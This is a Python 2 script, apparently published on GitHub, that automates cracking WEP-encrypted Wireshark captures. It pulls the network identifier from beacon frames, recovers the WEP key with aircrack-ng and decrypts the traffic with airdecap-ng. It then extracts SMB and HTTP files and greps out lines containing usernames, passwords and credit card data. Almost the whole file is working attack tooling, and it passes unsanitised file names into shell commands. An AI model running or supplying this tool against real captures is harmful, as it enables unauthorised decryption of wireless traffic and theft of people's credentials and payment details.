#!/usr/bin/python
# coding:UTF-8

# -------------------------------------------------------------------------------------
#      PYTHON UTILITY FILE TO CRACK ENCRYPTED .PCAP FILES CAPTURED BY WIRESHARK
#                BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)
# -------------------------------------------------------------------------------------

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : 2.0                                                                
# Details : Load required imports.
# Modified: N/A
# -------------------------------------------------------------------------------------

import os
import sys

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : 2.0                                                                
# Details : Display my universal header.    
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

os.system("clear")

print " ____   ____    _    ____     ____ ____      _    ____ _  _______ ____   "
print "|  _ \ / ___|  / \  |  _ \   / ___|  _ \    / \  / ___| |/ / ____|  _ \  "
print "| |_) | |     / _ \ | |_) | | |   | |_) |  / _ \| |   | ' /|  _| | |_) | "
print "|  __/| |___ / ___ \|  __/  | |___|  _ <  / ___ \ |___| . \| |___|  _ <  "
print "|_|    \____/_/   \_\_|      \____|_| \_\/_/   \_\____|_|\_\_____|_| \_\ "
print "                                                                         "
print "         BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)           "

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : 2.0                                                                
# Details : Conduct routine and simple tests on supplied arguements.   
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

filename = sys.argv[1]

if os.path.exists(filename) == 0:
    print "\nFile " + filename + " was not found, did you spell it correctly?"
    exit(True)

if os.geteuid() != 0:
    print "\nPlease run this python script as root..."
    exit(True)

if len(sys.argv) < 2:
    print "\nUse the command python pcap-cracker.py wiresharkfile.pcapng\n"
    exit(True)

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : 2.0                                                                
# Details : Check all required dependencies are installed on the system.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

checklist = [ "airmon-ng", "tshark", "editcap" ,"pcapfix"]
installed = True

for check in checklist:
    cmd = "find / -name " + check + " > /dev/null"
    checked = os.system(cmd)
    if checked != 0:
        print check + " is missing..."
        installed = False

if installed == True:
    print "\nAll required dependencies are pre-installed...\n"
else:
    print "\nInstall missing dependencies before you begin..."
    exit (True)

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : 2.0                                                                
# Details : Check type of wireshark file and adjust as required (pcapng -->  pcap).
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

newfiletype = filename[:-2]
typetest = filename[-6:]
print "Filename          : " + filename
print "File Format       : " + typetest
if typetest == "pcapng":
    print "Crack Status      : Converting file format..."
    os.system("editcap -F pcap " + filename + " " + newfiletype + " > /dev/null")
    filename = filename[:-2]
    print "New Filename      : " + filename

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : 2.0                                                                
# Details : Sometimes captured .PCAP files cut off or are corrupted in other ways.    
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

os.system("pcapfix -d " + filename + " -o Fixerror.pcap > /dev/null")

if os.path.isfile('./Fixerror.pcap') !=0:
    os.rename(filename, "Oldpcapfile.pcap")
    os.rename("Fixerror.pcap", filename)
    print "Crack Status      : Fixing file errors.." + filename
    print "Orginal Renamed   : Oldpcapfile.pcap" 

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : 2.0                                                                
# Details : Extract the SSID from the .PCAP file.    
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

print('-' * 100)
cmd = "tcpdump -ennr " + filename + " '(type mgt subtype beacon)' | awk '{print $13}' | sed 's/[()]//g;s/......//' | sort | uniq > SSID.txt"
os.system(cmd)
print('-' * 100)

ssid = open("SSID.txt").readline().rstrip()
os.remove('./SSID.txt')
ssid = "00:" + ssid

if ssid == "00:":
    print "Empty SSID        : Error..."
    exit (True)
else:
    print "Service Set Id.   : " + ssid

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : 2.0                                                                
# Details : Extract the WEP key fom the .PCAP file using the SSID
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

os.system("aircrack-ng -b " + ssid + " " + filename + " > Answer.txt")
os.system("awk '/KEY FOUND!/{print $(NF-1)}' Answer.txt > WepKey.txt")
os.remove('./Answer.txt')
wep = open("WepKey.txt").readline().rstrip()
os.remove("./WepKey.txt")
print "Wired Privacy Key : " + wep

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : 2.0                                                                
# Details : Use the WEP key to creat a cracked version of the .PCAP file.  
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

os.system("airdecap-ng -w " + wep + " "+ filename +" " + "> /dev/null")
filename2 = filename[:-5]
filename2 = filename2 + "-dec.pcap"
os.rename(filename2, "Cracked.pcap")
print "Cracked File      : Cracked.pcap"

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : 2.0                                                                
# Details : Now conduct some reconissance on the cracked file.   
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

print "Crack Status      : Extracting Data...\n"
os.system("tshark -nr Cracked.pcap --export-objects smb,Smbfolder > /dev/null 2>/dev/null")
os.system("tshark -nr Cracked.pcap --export-objects http,Httpfolder > /dev/null 2>/dev/null")
os.system("ngrep -q -I Cracked.pcap | grep -i username > Username.txt")
os.system("ngrep -q -I Cracked.pcap | grep -i password > Password.txt")
os.system("ngrep -q -I Cracked.pcap | grep -i credit > Creditcard.txt")
os.system("ls -p")
exit (False)

#Eof
